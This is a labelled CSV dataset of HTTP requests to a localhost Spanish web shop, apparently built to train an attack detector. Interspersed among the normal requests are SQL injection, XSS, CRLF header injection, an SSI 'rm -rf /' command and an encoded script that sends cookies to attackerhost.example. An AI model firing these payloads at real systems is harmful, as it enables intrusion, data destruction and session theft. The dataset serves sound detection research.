query,label
http://localhost:8080/tienda1/asf-logo-wide.gif/.Old HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,0
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=chu-chue&password=dEPr67a&nombre=Marley&apellidos=Junqueras&email=craven.maillard%40xslive.th&dni=13189812W&direccion=Passatge+De+Graziella+Pareto%2C+63%2C+3%3FC&ciudad=Carrizo&cpA=10130&provincia=Zaragoza&ntc=7866818730779825&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ralina&pwd=desacertadamente&remember=off&B1=Entrar HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
modo=registro&login=mullinix&password=portadguero&nombre=Nanda&apellidos=Santagata+Pillajo&email=wakasa%40miami-beach.gf&dni=44636251J&direccion=C%2F+Perro+De+San+Cecilio%2C+197+11%3FA&ciudad=Cerro+de+And%E9valo%2C+El&cp=19275&provincia=Guadalaja%2Fra&ntc=5604259372572557&B1=Registrar,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=tania&password=aritm%E9tica&nombre=Nahir&apellidos=Lamo+Gelber&email=sherlock%40freecreditcheck.ec&dni=00776957V&direccion=C%2F+Antonio+Machado%2C+1+&ciudad=Pe%F1aranda+de+Bracamonte&cp=19112&provincia=%C1vila&ntc=378274661282900A&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=eugenia&password=sIl%CDcula&nombre=Juan+de+Dios&apellidos=Bestard&email=oleilnikov_balasko%40hostprofessional.ac&dni=84996241V&direccion=Padre+Maltes+26+5A&ciudad=Villarejo-Periesteban&cp=47172&provincia=Huesca&ntc=0183912378069519&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=eli%2Bs*%2Fa&pwd=4ar9ues4a&remember=off&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
modo=entrar&login=schute&pwd=co45amb%2Cre5a&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sabety&pwd=desfacedora&remember=on&B1=Entrar HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,0
id=1&nombre=Vino+Rioja&precio=85&cantidad=92&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=wattier&pwd=esclisiado&remember=off&B1=Entrar HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
errorMsg=Credenciales+incorrectas,0
errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=shirleen&password=recer%EDdo&nombre=Amaranta&apellidos=Gramajo&email=men%40altoguadiana.pw&dni=02624260Y&direccion=Los+Giles+99%2C+1%3FA&ciudad=Sotoba%F1ado+y+Priorato&cp=19192&provincia=Madrid&ntc=0433193970984111&B1=Registrar HTTP/1.1,0
http://localhost:8080/4861362529278789730~ HTTP/1.1,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=scanlan&password=2n5fe2ta2a&nombre=Rasmira&apellidos=Pavi%E9+Pool&email=gloves%40sms24h.mk&dni=92795576Y&direccion=Calle+Jose+Luis+De+Arrese%2C+105+1%3FF&ciudad=Ger&cp=24370&provincia=Cantabria&ntcA=7563981891605435&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kuntova&pwd=TROvA&remember=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&B1=Entrar HTTP/1.1,1
id=1%2F&nombre=Vino+Rioja&precio=100&cantidad=58&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6908&B1A=Confirmar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,0
id=2,0
modo=registro&login=briana&password=1es8r59z6&nombre=Mayid&apellidos=Pareja&email=eggerikx%40intercambiodeenlaces.gl&dni=72999469E&direccion=C%2F+Hipodromo+De+Pineda%2C+123%2C+11-G&ciudad=Cinco+Olivas&cp=42169&provincia=Barcelo%2Bn*a&ntc=1600482599299219&B1=Registrar,1
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=viswa&pwd=0sc9d25.2&remember=on%2F&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
modo=entrar&login=marion&pwd=sescun3ia&remember=on&B1=Entrar,0
http://localhost:8080/asf-logo-wide.inc HTTP/1.1,1
idA=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=75&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F HTTP/1.1,1
errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1126&B1=Pasar+por+caja HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,0
id=3&nombre=Queso+Manchego&precio=100&cantidad=84&B1=A%F1adir+al+carrito,0
modo=entrar&login=trixie&pwd=FalERNO&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
modo=entrar&login=diffie&pwd=Cayar%ED&remember=off&B1=Entrar%27INJECTED_PARAM,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=86&B1=A%F1adir+al+carrito HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sastry&password=3l607LaDO2&nombre=Emmanuelle&apellidos=Gonyalon+Salobre%F1a&email=bernt%40wdsl.yu&dni=82709891Mparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&direccion=Calle+Poligono+San+Pablo+143+6-D&ciudad=Gaztelu&cp=29711&provincia=Granada&ntc=6789852392757283&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
modo=insertar&precio=847&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
B2A=Vaciar+carrito,1
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,1
B2=Vaciar+carrito,0
errorMsg=Credenciales+incorrectas,0
modo=registro&login=yurik&password=a4orrachada&nombre=Rock&apellidos=Morales+Urgell&email=golabek%40joll.cf&dni=24231534E&direccion=Plegadero+Alto+48%2C+&ciudad=Alf%E0s+del+Pi%2C+l%27&cp=13120any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&provincia=Cuenca&ntc=7817403668944119&B1=Registrar,1
http://localhost:8080/tienda1/publico/pagar.jsp/4861362529278789730 HTTP/1.1,1
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=85&cantidad=38&B1=A%F1adir+al+carrito HTTP/1.1,0
errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
modo=registro&login=abbye%2B&password=vOL6%C16iCa&nombre=Justa&apellidos=Catalan+Mediero&email=covan-giftos%40monnal.so&dni=96303004A&direccion=Calle+Otero+Blas+De+35+4F&ciudad=Molacillos&cp=25670&provincia=C%E1ceres&ntc=4578401748982547&B1=Registrar,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
errorMsgA=Credenciales+incorrectas,1
modo=entrar&login=mirarchi&pwd=garaM2nTE&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
http://localhost:8080/samples/htmlsamp/tables.htm HTTP/1.1,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=crickard&password=chofe&nombre=Irene&apellidos=Blancas+Sol%F3rzano&email=billingsley%40yksoluap.sr&dni=44614622G&direccion=Gibraltar%2C+160+&ciudad=Cogollos&cp=10189&provincia=Cuenca&ntc=2593497468791354%27+DELETE+FROM+USERS&B1=Registrar HTTP/1.1,1
errorMsg=Credenciales+incorrectas,0
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,0
B2=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=yueping1&password=f9e2dora&nombre=Harissa&apellidos=Aregall+Picabea&email=goorwitz-sejbalova%40hostingprofessional.com.jobs&dni=66204492G&direccion=Risue%F1o+141%2C+&ciudad=Font+d%27En+Carr%F2s%2C+la%4040&cp=29551&provincia=Huelva&ntc=3999806738331009&B1=Registrar HTTP/1.1,1
id=%3F&nombre=Queso+Manchego&precio=100&cantidad=48&B1=A%F1adir+al+carrito,1
modo=registro&login=partello&password=brocato&nombre=Mica%EDas&apellidos=Buils+Szebesta&email=astar%40guiapolicial.lt&dni=57738017J&direccion=Passatge+De+Felipe+De+Paz+31%2C+8%3FB&ciudad=Etxebarria&cp=40170&provincia=Girona&ntc=4735417998508375&B1=Registrar,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sydeman6&pwd=0nC%2FOn%2F6it%2CAr&remember=on&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=nooshin&pwd=e5670cij%F33&remember=on&B1=Entrar HTTP/1.1,0
http://localhost:8080/servlet/SnoopServlet HTTP/1.1,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=76&B1=A%F1adir+al+carrito HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=pravato&password=rastrero&nombre=Robustiana&apellidos=Laspiur&emailA=kurz%40kayaalicante.cn&dni=60962318J&direccion=C%2F+Santa+Anna%2C+S%2FN+&ciudad=Villaespasa&cp=26292&provincia=Navarra&ntc=8682803216185712&B1=Registrar HTTP/1.1,1
modo=entrar&login=valletparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&pwd=a1r6e0o9&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Ques%2Bo+Manchego&precio=100&cantidad=24&B1=A%F1adir+al+carrito HTTP/1.1,1
modo=insertar&precio=2414&B1=Confirmar,0
modo=registro&login=lewes&password=76rMi69so&nombre=Monitor&apellidos=Stratten&email=adjani%40zoorapia.ma&dni=91257210H&direccion=C%2F+Salgueiral%2C+198+&ciudad=Montanuy&cp=48508&provincia=Zamora&ntc=0406141531828732&B1=Registrar,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chihchie&pwd=unicidad&remember=off%2F&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
http://localhost:8080/admin5.nsf HTTP/1.1,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29 HTTP/1.1,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=58&B1=A%F1adir+al+carrito HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
modo=registro&login=scythia&password=3389AGI48&nombre=Francesca&apellidos=Bagaria&email=hsaio%40suecas.com.ec&dni=15025159H&direccion=Carrer+Vallseca%2C+42%2C+&ciudad=Torrecilla+del+Pinar&cp=25225&provincia=Ja%E9n&ntc=2462273534930751&B1=Registrar,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2152&B1=Pasar+por+caja%2F HTTP/1.1,1
modo=entrar%4040&login=blann&pwd=brear&remember=off&B1=Entrar,1
modo=insertar&precio=3423&B1=Confirmar,0
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,0
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
id=2,0
modo=registro&login=finak&password=enero&nombre=Robertino&apellidos=Figuerola&email=salter%40quiromante.com.mg&dni=65223156D&direccion=C%2F+De+La+Radio+81%2C+7%3FB&ciudad=Membrilla&cp=09260&provincia=Navarra&ntc=7964371897239814&B1=Registrar,0
id=2&nombreA=Jam%F3n+Ib%E9rico&precio=39&cantidad=12&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=8744&B1=Confirmar HTTP/1.1,1
http://localhost:8080/tienda1/global/estilos.css.Old HTTP/1.1,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=22%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=A%F1adir+al+carrito HTTP/1.1,1
id=1,0
id=1&nombre=%27+AND+%271%27%3D%271&precio=39&cantidad=9&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dikaitis5&password=sAnIdaD&nombre=Evandro&apellidos=Valdivieso&email=james_ponnamma%40autobuses-hibridos.tn&dni=13791863M&direccion=El+Cartero+44+5-B&ciudad=Anguita&cp=34126&provincia=Alicante&ntc=3728906567349968&B1=Registrar HTTP/1.1,0
modo=registro&login=danzig&password=BibL7o718a24o&nombre=Mardoqueo&apellidos=Jaimes&email=coder%40enmenorca.com.tn&dni=30888361M&direccion=Calle+Rosa+De+Lima+S%2FN+4D&ciudad=Ulea&cp=09640&provincia=C%F3rdoba&ntc=2914128160766490&B1=Registrar%4040,1
modo=registro&login=helem&password=aPAreCEr&nombre=Pancho&apellidos=Goldaratz+Brizuela&email=lahbib_hodo%40silver-knights.ie&dni=54489862X&direccion=Berlin+116+&ciudadA=Sudanell&cp=24346&provincia=Burgos&ntc=3191456339688389&B1=Registrar,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=lockett&pwd=8O0An0o2a&remember=on&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
errorMsg=Credenciales+incorrectas,0
modo=entrar&login=kareem&pwd=lug5r&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=9&B1A=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7896&B1=Confirmar%2F HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
B2=Vaciar+carrito,0
modo=registro&login=rff&password=pinCaRRaS%3FcA&nombre=Valeria&apellidos=Elbar+Brice%F1o&email=sterndale-bennett%40deltamarina.je&dni=64105225Q&direccion=Tres+Reis%2C+20+9%3FE&ciudad=Montblanc&cp=45685&provincia=Valencia&ntc=6556979183874771&B1A=Registrar,1
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
id=2&nombre=Queso+Manchego&precioA=39&cantidad=27&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=87&B1=A%F1adir+al+carrito HTTP/1.1,0
modo=insertar&precio=6957&B1=Pasar+por+caja%2F,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,0
id=1,0
modo=registro&login=schenck6&password=oTorgADERa&nombre=Balbino&apellidos=Zapata+Pine%3F&email=falconetti%40normatic-vending.ar&dni=77359416C&direccion=Calle+Lope+De+Vega+19+&ciudad=Valle+de+Losa&cp=02270&provincia=Valladolid&ntc=2171024439369893&B1=Registrar,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1,1
id=2,0
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
id=2,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=far&password=5E13Er3&nombre=Dardo&apellidos=Marola&email=si%40bunruang%40sandra%40summer.uk&dni=87896249R&direccion=Puente+De+La+Ribera+191%2C+&ciudad=Sineu&cp=37256&provincia=Burgos&ntc=4819220729146482&B1=Registrar HTTP/1.1,1
modo=entrar&login=%27%2Cb%27rieda&pwd=ric8Me6te&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
id=1&nombre=Queso+Manchego&precioA=39&cantidad=64&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
id=2&nombre=Vino+Rioja&precio=85&cantidad=57&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/autenticar.jsp/asf-logo-wide.gif HTTP/1.1,1
modo=registro&login=uchida&password=g2R0N8U54&nombre=Nariana&apellidos=Hop-man-s&email=caba.colley%40grandesinventos.mil&dni=12952733F&direccion=Balandrau%2C+142+&ciudad=Sant+Juli%E0+de+Vilatorta&cp=49325&provincia=Teruel&ntc=4276436600422398&B1=Registrar,1
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29 HTTP/1.1,1
http://localhost:8080/tienda1/publico/6909030637832563290.jsp.old HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
id=1,0
http://localhost:8080/tienda1/publico/pagar.jsp/~ HTTP/1.1,1
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
B2A=Vaciar+carrito,1
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=metyn&pwd=conceptear&remember=on&B1=Entrar HTTP/1.1,0
modoA=entrar&login=ketan&pwd=reng1era&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2144&B1=Confirmar HTTP/1.1,0
http://localhost:8080/tienda1/asf-logo-wide.gif/ HTTP/1.1,1
http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=alzofon&password=0in5fera&nombre=Rosario&apellidos=Narva&email=stadbauer%40aadsl.de&dni=77987215B&direccion=Passatge+Serracant%2C+34+7-C%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&ciudad=Azaila&cp=18132&provincia=Almer%EDa&ntc=1281089993352659&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/1.gif/asf-logo-wide.INC HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&login=drappel&pwd=innoc52&remember=off&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,0
modo=registro&login=tanchak&password=m01vi3&nombre=Ridgley&apellidos=Murgu%EDa+Aversa&email=wendell%40somosagelespa%F1a.ml&dni=21302211W&direccion=C%2F+Alqueria+De+Rubiols%2C+S%2FN%2C+11%3FD&ciudad=Alc%FAdia+de+Crespins%2C+l%27&cp=25270&provincia=Almer%EDa&ntc=6144372823408043&B1=Registrar,0
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
idA=2,1
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=asbjorn&pwdA=virulenta&remember=on&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=paone&password=gUStat0V4&nombre=Federico&apellidos=Almirall+Pahisa&email=takamine_kulky%40comonuevo.bv&dni=22859316F&direccion=Calle+Japon%2C+124%2C+10A&ciudad=San+Andr%E9s+del+Rey&cp=49515&provincia=Madrid&ntc=7611183184008981&B1=Registrar HTTP/1.1,0
